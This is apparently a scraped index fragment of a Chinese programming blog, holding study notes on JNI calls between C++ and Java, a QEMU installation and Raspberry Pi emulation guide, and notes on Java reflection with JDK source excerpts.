env-\u0026gt;GetBooleanMethod(obj,id_function,args); delete[] args; //是否指针堆内存 2.3.2 Java和C++中的多态机制 JNIEnv中的特殊方法CallNovirtualMethod。来帮助java调用Java中父类的方法。\n介绍了-C++和java多态的基础知识。\n步骤：\n获取obj中对象的class 对象 GetObjectClass(obj)\n获取java中father字段的id GetFieldID()\n获取father字段的对象类型 GetObjectField\n获取father对象的class对象 FindClass\n获取father对象中function方法ID GetMethodID()\n调用父类中的function方法（会执行子类的方法）CallvoidMethod\n调用父类中的function方法（会执行父类的方法）CallNonvirtualVoidMethod()\n2.4 创建Java对象及字符串的操作方法 2.4.1 native中创建Java对象 ​ 两种方法：\n第一种：\njobject Newobject(jclass clazz,jmethodID methodID,·····)\nclazz 需要创建的Java对象的Class对象。\nmethodID :传递一个方法的ID: 构造方法\n第三个参数：构造函数需要传入的参数值（默认不传递） 默认构造方法返回值签名始终是“()V”,方法的名称始终是“\n”。\n在C++中构造Java中的Date对象调用方法getTime():\n1 2 3 4 5 6 jclass clazz_date = env-\u0026gt;FindClass(\u0026#34;java/util/Date\u0026#34;); //获取date对象 jmethodID mid_date = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;\u0026lt;init\u0026gt;\u0026#34;,\u0026#34;()V\u0026#34;); //获取构造方法的ID jobject now = env-\u0026gt;NewObject(clazz_date,mid_date); //生成Date对象 jmethodID mid_date_getTime = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;getTime()\u0026#34;,\u0026#34;()J\u0026#34;); //获取getTime的ID jlong time = env-\u0026gt;CallLongMethod(now,mid_date_getTime);//调用getTime返回时间 printf(\u0026#34;%I64d\u0026#34;,time); 第二种：\n用AllocObject函数创建一个对象，可以根据传入的jclass创建一个java对象，但是状态时未初始化的，在这个对象之前绝对要用CallNonvirtualVoidMethod来调用该jclass的构造函数这样可以延迟构造函数的调用。用的比较少。\neg：略；\n2.4.2 native中操作Java字符串 ​ Java-String对象是Unicode(UTF-16)码 一个字符总是占用两个字节 可以通过JNI接口将Java中的字符串转换到C++的宽字符串（wchar_t*),或者传回一个UTF-8编码的字符串（char * )到C++ 反过来同理。\nJNIEnv中的一些C++方法：\n1）获取字符串的长度：\n​ jsize GetStringLength(jstring j_msg)\n将jstring 对象拷贝到const jchar* 指针字符串： ​ //拷贝Java字符串并以UTF-8编码传入jstr:\n​ env-\u0026gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);\n​ ////拷贝Java字符串并以UTF-16编码传入jstr:\n​ env-\u0026gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);\n生成一个jstring 对象 ​ jobject NewString(const jchar* jstr,int size);\n​ 将字符串指针jstr转换成jstring。\n将jstring对象转换成const jchar* 字符串指。 GetStringChars 开内存 指针指向先开的内存\nconst* jchar * GetStringChars(jstring j_msg,jboolean* copied)\n返回一个UTF-16编码的宽字符串（jchar*);\n对应的释放内存方法：\nReleaseStringChars(jstring j_msg,const jchar* jstr)\nGetStringUTFChars 不开内存直接指向Java中string的指针\nconst char* GetStringUTFChars(jstring str,jboolean* copied)\n取得UTF-8编码的字符串\n释放：\nReleaseStringUTFChars(jstring j_msg,const jchar* jstr)\n将jstring 对象转化成const jchar* 字符串指针： ​ const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)\n​ 作用:增加直接传回指向Java字符串的指针的可能性（而不是拷贝）；\n​ 在GetStringCritical/ReleaseStringCritical之间的关键区域之间不能调用任何其他JNI函数。否则会造成关键区域代码执行期间垃圾回收器停止工作。任何触发垃圾回收器的的线程也将暂停。\n​ 释放：\n​ ReleaseStringCritical(jstring j_msg,const jchar* jstr)\n实例eg：（与书上不同,思路大概相同）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class MainActivity extends AppCompatActivity { private EditText et; private TextView tv; private Button bt; public String text = null; // Used to load the \u0026#39;native-lib\u0026#39; library on application startup. static { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); et = findViewById(R.id.editText); tv = findViewById(R.id.tv); bt = findViewById(R.id.button); bt.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { text = et.getText().toString().trim(); callCppFunction(); tv.setText(text); } }); } public native void callCppFunction(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv *env, jobject instance) { // TODO //获取text jfieldID fid_tx = env-\u0026gt;GetFieldID(env-\u0026gt;GetObjectClass(instance),\u0026#34;text\u0026#34;,\u0026#34;Ljava/lang/String;\u0026#34;); //获取ext对象 jstring j_tx = (jstring)env-\u0026gt;GetObjectField(instance,fid_tx); //第一种方式 //获得字符串指针： const jchar* jstr1 = env-\u0026gt;GetStringChars(j_tx,NULL); //z转换成宽字符 wstring wstr((const wchar_t*)jstr1); //释放指针 env-\u0026gt;ReleaseStringChars(j_tx,jstr1); //第一种END //第二种 const jchar * jstr2 = env-\u0026gt;GetStringCritical(j_tx,NULL); wstring wstr2((const wchar_t*)jstr2); env-\u0026gt;ReleaseStringCritical(j_tx,jstr2); //END //第三种 jsize len = env-\u0026gt;GetStringLength(j_tx); //获取长度 jchar * jstr3 = new jchar[len+1]; jstr3[len]=L\u0026#39;\\0\u0026#39;; //复制 env-\u0026gt;GetStringRegion(j_tx,0,len,jstr3); wstring wstr3((const wchar_t*)jstr3); delete[] jstr3; //End //倒序 reverse(wstr.begin(),wstr.end()); jstring j_new_str = env-\u0026gt;NewString((const jchar*)wstr.c_str(),(jint)wstr.size()); env-\u0026gt;SetObjectField(instance,fid_tx,j_new_str); } ​\n2.5 C/C++中操作Java中的数组 ​ 在java中数组分为两种：\n基本类型数组\n对象类型数组\n一个能用于两种不同类型数组的函数是：GetArrayLength(jarray array)。\n2.5.1 操作基本类型的数组 GetArrayElements方法Get\u0026lt;Type\u0026gt;ArrayElements(\u0026lt;Type\u0026gt;Array arr,jboolean* isCopide)\n把Java中的基本类型的数组转换成C++中的数组 两种方式：\n一是拷贝一份传回本地，另外一种是把指向Java数组的指针直接传回到本地代码中\n处理完后，通过ReleaseArrayelements 来释放数组。\nReleaseArrayelement 方法Release\u0026lt;Type\u0026gt;Arrayelement(Type\u0026gt;Array arr,\u0026lt;Type\u0026gt;* array,jint mode)\n这个函数可以选择如何处理Java和C++中的数组，是提交还是撤销····内存是否释放等等。\nmode的取值：\n0：对Java的数组进行更新并且释放C/C++数组\nJNI_COMMIT：更新但是不释放\nJNI_ABOUT：不更新，释放。\nGetPrimittiveArrayCritical方法\nGetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)\nReleasePrimittiveArrayCritical方法\nReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)\nGetArrayRegion方法Get\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,\u0026lt;Type\u0026gt;* buffer)\n在C++中开辟内存，拷贝数组到内存中。\nSetArrayRegionSet\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,const \u0026lt;Type\u0026gt;* buffer)\n把Java基本类型数组中的指定范围的元素用C++数组中的元素来赋值。\nArrayNew方法\u0026lt;Type\u0026gt;ArrayNew\u0026lt;Type\u0026gt;Array(jszie sz)\n指定一个长度然后返回相应的Java基本类型的数组。\n2.5.2 操作对象数组类型 ​ JNI未提供把Java对象数组 直接转到C++对象数组的函数。而是通过Get/SetObjectArrayaElement这样的函数来对java中的对象数组进行操作。因为未拷贝 所以没有释放操作。NewObjectArray可以通过指定长度和初始值来创建某一个类的数组。\n例子：两种类型的操作：\n略·····\n​ 注：书本P34-36\n2.6 C++/C中的引用类型和ID缓存 2.6.1 引用类型 ​ 从Java创建对象传到本地C/C++代码时会产生引用，根据Java的垃圾回收机制，只要存在引用就不会触发改引用所指的Java对象垃圾回收。\n​ 几种C/C++中的引用类型：\n局部引用：（最常见）\n局部引用只在该native函数中有用，所有在该函数中产生的局部引用，都会在函数返回时自动释放，也可以使用DeleteLocalRef函数手动释放。\n有效期中能传递到别的本地函数中，千万不要用C++全局变量保存它，或者把它定义为C++静态局部变量。\n全局引用：\n可以跨越当前线程，在对个native函数中有效，需要手动释放。会阻止垃圾回收器回收这个引用所指的对象。\n不同于局部引用，全局引用的创建不是由JNI自动创建的，全局引用是需要调用NewGlobalRef函数，释放使用ReleaseGlobalRef函数。\n弱全局引用\n与全局引用相似。不一样的为不会阻止垃圾回收器回收这个引用所指对象，使用NewWeakGlobalRef和ReleaseWeakGlobalRef来产生和释放。\n关于引用的一些函数：\njobject NewGlobalRef(jobject obj)\njobject NewLocalRef(jobject obj)\njobject New WeakGlobalRef(jobject obj)\nvoid DeleteGlobalRef(jobject obj)\nvoid DeleteLocalRef(jobject obj)\nvoid DeleteWeakGlobalRef(jobject obj)\n很容易理解上面6个函数\njboolean IsSameObject(jobject obj1,jobject obj2)\n这个函数用来比较两个引用是否相等，但是对于弱引用有一个特别的功能，如果把NULL传入要比较的对象中就能判断弱全局引用所指的Java对象是否被回收。\n缓存jfieldID/jmethodID.减小查询开销。\n2.6.2 缓存方法 在用的时候缓存\n在native代码中使用static局部变量来保存已经查询过的id,就缓存下了id。\n在Java类初始化时缓存\n比较好的方法，在native调用前把所有ID全部保存下来。可以让Java代码在第一次加载这个类的时候首先调用本地代码初始化所有的jfildID/jmethodID.这样可以省去多次确定ID是否存在的语句。这些jfildID/jmethodID定义在C++的全局。当java类卸载或者重新加载的时候，也会重新计算ID.\n1 2 3 4 5 6 7 8 9 10 public class TestNative{ static{ initNativeIDs(); //静态代码块进行初始化 } static native void initNativeIDs(); int propInt = 0; String propStr = \u0026#34;\u0026#34;; public native void otherNative(); ··········· } 1 2 3 4 5 6 7 8 9 10 jfieldID g_propInt_id = 0; jfieldID g_propStr_id = 0; JNIEXPORT void JNICALL Java_····init（JNIEnv* env,jobject clazz）{ jfieldID g_propInt_id = GetfieldID(clazz,\u0026#34;propInt\u0026#34;,\u0026#34;I\u0026#34;); jfieldID g_propStr_id = GetfieldID(clazz,\u0026#34;propStr\u0026#34;,\u0026#34;/Ljava/lang/String;\u0026#34;); } JNIEXPORT void JNICALL Java_····other（JNIEnv* env,jobject clazz）{ ············ } 总结 ​ 主要是NDK开发相关。\n​ 感觉系统的学了一遍还是感觉不错的。\n可以多找网上的例子来练习练习，加深对JNI 的了解。\n","date":"2018-08-16T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/","title":"Android应用安全防护和逆向分析-基础篇2"},{"content":"QUME的安装使用(补充) QEMU的安装使用 安装 WIndows：https://qemu.weilnetz.de/w64/ 下载exe安装就行\nMACOS:brew install qemu or sudo port install qemu\nLINUX：\nArch: pacman -S qemu\nDebian/Ubuntu: apt-get install qemu\nFedora: dnf install @virtualization\nGentoo: emerge --ask app-emulation/qemu\nRHEL/CentOS: yum install qemu-kvm\nSUSE: zypper install qemu\n源码安装：https://download.qemu.org/\nwget\n1 2 3 4 5 wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz tar xvJf qemu-3.0.0-rc1.tar.xz cd qemu-3.0.0-rc1 ./configure make git\n1 2 3 4 5 6 git clone git://git.qemu.org/qemu.git cd qemu git submodule init git submodule update --recursive ./configure make 最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。\n树莓派内核制作（在windows上) 下载树莓派系统：http://downloads.raspberrypi.org/raspbian/images/\n下载qume 的树莓派内核： https://github.com/dhruvvyas90/qemu-rpi-kernel 改名为kernel-qemu放在和系统镜像同目录下\n放在了raspbia目录下\nqemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append \u0026quot;root=/dev/sda2 panic=1rootfstype=ext4 rw\u0026quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img\n注意自己下载的镜像版本\nLinux上 待补充。。。\n","date":"2018-08-09T00:00:00+08:00","permalink":"https://ykiko.top/p/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/","title":"QUME的安装使用(补充)"},{"content":"Java反射机制学习笔记 Java 反射机制学习记录 在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。\n什么是反射机制？ 反射(Reflection)是Java 程序开发语言的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。 通俗一点：在动态运行时，获取到一个类的所有方法以及成员。简而言之，通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。\n作用？ 1.在运行时判断任意一个对象所属的类；\n2.在运行时构造任意一个类的对象；\n3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；\n4.在运行时调用任意一个对象的方法\n是运行时而不是编译时 获取某些类的一些变量，调用某些类的私有方法。\n增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.\n基本使用 反射相关的类一般都在java.lang.relfect 包里。\n获取Class对象 3种方法\n(1)使用Class类的forName静态方法:\n1 2 3 public static Class\u0026lt;?\u0026gt; forName(String className) //在JDBC开发中常用此方法加载数据库驱动: Class.forName(driver); (2)直接获取某一个对象的class，比如:\n1 2 Class\u0026lt;?\u0026gt; klass = int.class; Class\u0026lt;?\u0026gt; classInt = Integer.TYPE; (3)调用某个对象的getClass()方法,比如:\n1 2 StringBuilder str = new StringBuilder(\u0026#34;123\u0026#34;); Class\u0026lt;?\u0026gt; klass = str.getClass(); 判断是否为某一个类的实例\n一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断 是一个Native方法：\n1 public native boolean isInstance(Object obj); 创建实例\n通过放射来生成对象两种方式：\n（1）使用Class对象的newInstance()方法来创建Class对象对应类的实例。\n1 2 Class\u0026lt;?\u0026gt; c = String.class; Object str = c.newInstance(); （2）先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。\n1 2 3 4 5 6 7 //获取String所对应的Class对象 Class\u0026lt;?\u0026gt; c = String.class; //获取String类带一个String参数的构造器 Constructor constructor = c.getConstructor(String.class); //根据构造器创建实例 Object obj = constructor.newInstance(\u0026#34;23333\u0026#34;); System.out.println(obj); 获取方法\ngetDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。\n1 public Method[] getDeclaredMethods() throws SecurityException getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。\n1 public Method[] getMethods() throws SecurityException getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象\n1 public Method getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) eg:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class test { public static void test1() throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { Class\u0026lt;?\u0026gt; c = methodClass.class; Object object = c.newInstance(); Method[] methods = c.getMethods(); Method[] declaredMethods = c.getDeclaredMethods(); Method method = c.getMethod(\u0026#34;add\u0026#34;, int.class, int.class); //获取add方法 System.out.println(\u0026#34;getMethods获取的方法：\u0026#34;); for (Method m : methods) System.out.println(m); System.out.println(\u0026#34;getDeclaredMethods获取的方法：\u0026#34;); for (Method m : declaredMethods) System.out.println(m); } public static void main(String[] args) { try{ test1(); }catch (Exception e){ e.printStackTrace(); } } } class methodClass { public final int fuck = 3; public int add(int a,int b) { return a+b; } public int sub(int a,int b) { return a+b; } } 获取构造器信息\n通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例:\n1 public T newInstance(Object ... initargs) 获取类的成员字段信息\ngetFiled: 访问公有的成员变量\ngetDeclaredField：所有已声明的成员变量。但不能得到其父类的成员变量\ngetFileds和getDeclaredFields用法同上（参照Method）\n调用方法\n获取到方法后使用invoke()方法来调用这个方法\n1 2 3 public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException eg：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class test1 { public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { Class\u0026lt;?\u0026gt; klass = methodClass.class; //创建methodClass的实例 Object obj = klass.newInstance(); //获取methodClass类的add方法 Method method = klass.getMethod(\u0026#34;add\u0026#34;,int.class,int.class); //调用method对应的方法 =\u0026gt; add(1,4) Object result = method.invoke(obj,1,4); System.out.println(result); } } class methodClass { public final int fuck = 3; public int add(int a,int b) { return a+b; } public int sub(int a,int b) { return a+b; } } 创建数组\n1 2 3 4 5 6 7 8 9 10 11 12 public static void testArray() throws ClassNotFoundException { Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;java.lang.String\u0026#34;); Object array = Array.newInstance(cls,25); //通过Array.newInstance() //往数组里添加内容 Array.set(array,0,\u0026#34;hello\u0026#34;); //Array类为java.lang.reflect.Array Array.set(array,1,\u0026#34;Java\u0026#34;); Array.set(array,2,\u0026#34;fuck\u0026#34;); Array.set(array,3,\u0026#34;Scala\u0026#34;); Array.set(array,4,\u0026#34;Clojure\u0026#34;); //获取某一项的内容 System.out.println(Array.get(array,3)); } 1 2 3 4 public static Object newInstance(Class\u0026lt;?\u0026gt; componentType, int length) throws NegativeArraySizeException { return newArray(componentType, length); } 1 2 private static native Object newArray(Class\u0026lt;?\u0026gt; componentType, int length) throws NegativeArraySizeException; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 arrayOop Reflection::reflect_new_array(oop element_mirror, jint length, TRAPS) { if (element_mirror == NULL) { THROW_0(vmSymbols::java_lang_NullPointerException()); } if (length \u0026lt; 0) { THROW_0(vmSymbols::java_lang_NegativeArraySizeException()); } if (java_lang_Class::is_primitive(element_mirror)) { Klass* tak = basic_type_mirror_to_arrayklass(element_mirror, CHECK_NULL); return TypeArrayKlass::cast(tak)-\u0026gt;allocate(length, THREAD); } else { Klass* k = java_lang_Class::as_Klass(element_mirror); if (k-\u0026gt;oop_is_array() \u0026amp;\u0026amp; ArrayKlass::cast(k)-\u0026gt;dimension() \u0026gt;= MAX_DIM) { THROW_0(vmSymbols::java_lang_IllegalArgumentException()); } return oopFactory::new_objArray(k, length, THREAD); } } Array类的set()和get()方法都为Native方法，在HotSpot JVM里分别对应Reflection::array_set和Reflection::array_get方法\n获取泛型\ngetGenericHelper(HashMap\u0026lt;String, Person\u0026gt; map)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public static void getGenericType() { try { Method method =TestHelper.class.getDeclaredMethod(\u0026#34;getGenericHelper\u0026#34;,HashMap.class); Type[] genericParameterTypes = method.getGenericParameterTypes(); // 检验是否为空 if (null == genericParameterTypes || genericParameterTypes.length \u0026lt; 1) { return ; } // 取 getGenericHelper 方法的第一个参数 ParameterizedType parameterizedType=(ParameterizedType)genericParameterTypes[0]; Type rawType = parameterizedType.getRawType(); System.out.println(\u0026#34;----\u0026gt; rawType=\u0026#34; + rawType); Type[] actualTypeArguments = parameterizedType.getActualTypeArguments(); if (actualTypeArguments==genericParameterTypes || actualTypeArguments.length\u0026lt;1) { return ; } // 打印出每一个类型 for (int i = 0; i \u0026lt; actualTypeArguments.length; i++) { Type type = actualTypeArguments[i]; System.out.println(\u0026#34;----\u0026gt; type=\u0026#34; + type); } } catch (Exception e) { } } 获得 Metho,Field,Constructor 的访问权限\n1 2 int modifiers = method.getModifiers(); Modifier.toString(modifiers); Invoke方法 比较重点\ninvoke方法的实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } 权限检查\n首先检查AccessibleObject的override属性的值 。AccessibleObject 类是 Field、Method 和 Constructor 对象的基类 。override 默认为false,调试需要权限调用规则，反正不需要。\n默认情况下首先用Reflection.quickCheckMemberAccess(clazz, modifiers)方法检查方法是否为public，如果是的话跳出本步；如果不是public方法，那么用Reflection.getCallerClass()方法获取调用这个方法的Class对象，这是一个native方法:\n1 2 @CallerSensitive public static native Class\u0026lt;?\u0026gt; getCallerClass(); 1 2 3 4 5 JNIEXPORT jclass JNICALL Java_sun_reflect_Reflection_getCallerClass__ (JNIEnv *env, jclass unused) { return JVM_GetCallerClass(env, JVM_CALLER_DEPTH); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 JVM_ENTRY(jclass, JVM_GetCallerClass(JNIEnv* env, int depth)) JVMWrapper(\u0026#34;JVM_GetCallerClass\u0026#34;); // Pre-JDK 8 and early builds of JDK 8 don\u0026#39;t have a CallerSensitive annotation; or // sun.reflect.Reflection.getCallerClass with a depth parameter is provided // temporarily for existing code to use until a replacement API is defined. if (SystemDictionary::reflect_CallerSensitive_klass() == NULL || depth != JVM_CALLER_DEPTH) { Klass* k = thread-\u0026gt;security_get_caller_class(depth); return (k == NULL) ? NULL : (jclass) JNIHandles::make_local(env, k-\u0026gt;java_mirror()); } // Getting the class of the caller frame. // // The call stack at this point looks something like this: // // [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ] // [1] [ @CallerSensitive API.method ] // [.] [ (skipped intermediate frames) ] // [n] [ caller ] vframeStream vfst(thread); // Cf. LibraryCallKit::inline_native_Reflection_getCallerClass for (int n = 0; !vfst.at_end(); vfst.security_next(), n++) { Method* m = vfst.method(); assert(m != NULL, \u0026#34;sanity\u0026#34;); switch (n) { case 0: // This must only be called from Reflection.getCallerClass if (m-\u0026gt;intrinsic_id() != vmIntrinsics::_getCallerClass) { THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), \u0026#34;JVM_GetCallerClass must only be called from Reflection.getCallerClass\u0026#34;); } // fall-through case 1: // Frame 0 and 1 must be caller sensitive. if (!m-\u0026gt;caller_sensitive()) { THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), err_msg(\u0026#34;CallerSensitive annotation expected at frame %d\u0026#34;, n)); } break; default: if (!m-\u0026gt;is_ignored_by_security_stack_walk()) { // We have reached the desired frame; return the holder class. return (jclass) JNIHandles::make_local(env, m-\u0026gt;method_holder()-\u0026gt;java_mirror()); } break; } } return NULL; JVM_END 获取了这个Class对象caller后用checkAccess方法做一次快速的权限校验 :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 volatile Object securityCheckCache; void checkAccess(Class\u0026amp;lt;?\u0026amp;gt; caller, Class\u0026amp;lt;?\u0026amp;gt; clazz, Object obj, int modifiers) throws IllegalAccessException { if (caller == clazz) { // 快速校验 return; // 权限通过校验 } Object cache = securityCheckCache; // read volatile Class\u0026amp;lt;?\u0026amp;gt; targetClass = clazz; if (obj != null \u0026amp;amp;\u0026amp;amp; Modifier.isProtected(modifiers) \u0026amp;amp;\u0026amp;amp; ((targetClass = obj.getClass()) != clazz)) { // Must match a 2-list of { caller, targetClass }. if (cache instanceof Class[]) { Class\u0026amp;lt;?\u0026amp;gt;[] cache2 = (Class\u0026amp;lt;?\u0026amp;gt;[]) cache; if (cache2[1] == targetClass \u0026amp;amp;\u0026amp;amp; cache2[0] == caller) { return; // ACCESS IS OK } // (Test cache[1] first since range check for [1] // subsumes range check for [0].) } } else if (cache == caller) { // Non-protected case (or obj.class == this.clazz). return; // ACCESS IS OK } // If no return, fall through to the slow path. slowCheckMemberAccess(caller, clazz, obj, modifiers, targetClass); } 先快速检查，未通过的话建立缓存，中间再检查；\n如果都没有通过：进行更详细的检查;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // Keep all this slow stuff out of line: void slowCheckMemberAccess(Class\u0026amp;lt;?\u0026amp;gt; caller, Class\u0026amp;lt;?\u0026amp;gt; clazz, Object obj, int modifiers, Class\u0026amp;lt;?\u0026amp;gt; targetClass) throws IllegalAccessException { Reflection.ensureMemberAccess(caller, clazz, obj, modifiers); // Success: Update the cache. Object cache = ((targetClass == clazz) ? caller : new Class\u0026amp;lt;?\u0026amp;gt;[] { caller, targetClass }); // Note: The two cache elements are not volatile, // but they are effectively final. The Java memory model // guarantees that the initializing stores for the cache // elements will occur before the volatile write. securityCheckCache = cache; // write volatile } 用Reflection.ensureMemberAccess方法继续检查权限，若检查通过就更新缓存，这样下一次同一个类调用同一个方法时就不用执行权限检查了，这是一种简单的缓存机制。\n调用MethodAccessor的invoke方法\n由sun.reflect.MethodAccessor 处理\n1 2 3 4 5 6 7 8 9 10 /** This interface provides the declaration for java.lang.reflect.Method.invoke(). Each Method object is configured with a (possibly dynamically-generated) class which implements this interface. */ public interface MethodAccessor { //是一个接口 /** Matches specification in {@link java.lang.reflect.Method} */ public Object invoke(Object obj, Object[] args) throws IllegalArgumentException, InvocationTargetException; } 分析其Usage可得它的具体实现类有:\nsun.reflect.DelegatingMethodAccessorImpl\nsun.reflect.MethodAccessorImpl\nsun.reflect.NativeMethodAccessorImpl\nmethodAccessor实例由reflectionFactory对象操控生成，它在AccessibleObject下的声明如下:\n1 2 3 4 5 6 // Reflection factory used by subclasses for creating field, // method, and constructor accessors. Note that this is called // very early in the bootstrapping process. static final ReflectionFactory reflectionFactory = AccessController.doPrivileged( new sun.reflect.ReflectionFactory.GetReflectionFactoryAction()); sun.reflect.ReflectionFactory类的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 public class ReflectionFactory { private static boolean initted = false; private static Permission reflectionFactoryAccessPerm = new RuntimePermission(\u0026#34;reflectionFactoryAccess\u0026#34;); private static ReflectionFactory soleInstance = new ReflectionFactory(); // Provides access to package-private mechanisms in java.lang.reflect private static volatile LangReflectAccess langReflectAccess; // 这里设计得非常巧妙 // \u0026#34;Inflation\u0026#34; mechanism. Loading bytecodes to implement // Method.invoke() and Constructor.newInstance() currently costs // 3-4x more than an invocation via native code for the first // invocation (though subsequent invocations have been benchmarked // to be over 20x faster). Unfortunately this cost increases // startup time for certain applications that use reflection // intensively (but only once per class) to bootstrap themselves. // To avoid this penalty we reuse the existing JVM entry points // for the first few invocations of Methods and Constructors and // then switch to the bytecode-based implementations. // // Package-private to be accessible to NativeMethodAccessorImpl // and NativeConstructorAccessorImpl private static boolean noInflation = false; private static int inflationThreshold = 15; //...... //这是生成MethodAccessor的方法 public MethodAccessor newMethodAccessor(Method method) { checkInitted(); if (noInflation \u0026amp;\u0026amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) { return new MethodAccessorGenerator(). generateMethod(method.getDeclaringClass(), method.getName(), method.getParameterTypes(), method.getReturnType(), method.getExceptionTypes(), method.getModifiers()); } else { NativeMethodAccessorImpl acc = new NativeMethodAccessorImpl(method); DelegatingMethodAccessorImpl res = new DelegatingMethodAccessorImpl(acc); acc.setParent(res); return res; } } //...... /** We have to defer full initialization of this class until after the static initializer is run since java.lang.reflect.Method\u0026#39;s static initializer (more properly, that for java.lang.reflect.AccessibleObject) causes this class\u0026#39;s to be run, before the system properties are set up. */ private static void checkInitted() { if (initted) return; AccessController.doPrivileged( new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // Tests to ensure the system properties table is fully // initialized. This is needed because reflection code is // called very early in the initialization process (before // command-line arguments have been parsed and therefore // these user-settable properties installed.) We assume that // if System.out is non-null then the System class has been // fully initialized and that the bulk of the startup code // has been run. if (System.out == null) { // java.lang.System not yet fully initialized return null; } String val = System.getProperty(\u0026#34;sun.reflect.noInflation\u0026#34;); if (val != null \u0026amp;\u0026amp; val.equals(\u0026#34;true\u0026#34;)) { noInflation = true; } val = System.getProperty(\u0026#34;sun.reflect.inflationThreshold\u0026#34;); if (val != null) { try { inflationThreshold = Integer.parseInt(val); } catch (NumberFormatException e) { throw new RuntimeException(\u0026#34;Unable to parse property sun.reflect.inflationThreshold\u0026#34;, e); } } initted = true; return null; } }); } } MethodAccessor实现有两个版本，一个是Java版本，一个是native版本 